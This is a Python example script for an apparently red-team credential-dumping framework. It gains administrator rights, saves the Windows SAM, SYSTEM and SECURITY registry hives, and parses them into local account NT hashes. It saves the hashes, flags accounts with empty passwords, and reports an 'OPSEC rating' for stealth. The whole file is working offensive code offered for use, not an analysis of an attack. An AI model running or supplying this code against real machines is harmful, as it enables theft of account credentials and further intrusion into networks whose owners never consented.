#!/usr/bin/env python3
"""
Example: Auto Extract and Parse
Demonstrates automatic method selection and hash extraction
"""

from rt_sam_extractor import SAMExtractor

def main():
    """Auto extract and parse example"""
    print("[*] Example: Auto Extract and Parse")
    print("="*60)
    
    # Initialize framework
    extractor = SAMExtractor(output_dir="example_dumps")
    
    # Check privileges
    if not extractor.check_privileges():
        print("[!] This example requires administrator privileges")
        return 1
    
    # Auto extract with preferred method
    print("\n[*] Auto-extracting registry hives (preferred: reg_save)...")
    result = extractor.auto_extract(preferred_method='reg_save')
    
    if not result:
        print("[-] All extraction methods failed")
        return 1
    
    print(f"\n[+] Extraction successful!")
    print(f"[+] Method used: {result['method']}")
    print(f"[+] OPSEC Rating: {result['opsec_rating']}")
    
    # Parse the extracted hives
    print("\n[*] Parsing registry hives...")
    credentials = extractor.parse_hives(
        result['sam'],
        result['system'],
        result.get('security'),
        save_hashes=True
    )
    
    if credentials:
        print(f"\n[+] Extracted {len(credentials)} local account hashes")
        
        # Show summary
        print(f"\n[*] Account Summary:")
        for cred in credentials:
            username = cred.get('username', 'Unknown')
            nt_hash = cred.get('nt_hash', '')
            
            # Check for empty password
            if nt_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':
                status = "(empty password)"
            else:
                status = ""
            
            print(f"    • {username} {status}")
        
        return 0
    else:
        print("[-] Failed to extract hashes")
        return 1


if __name__ == '__main__':
    import sys
    sys.exit(main())
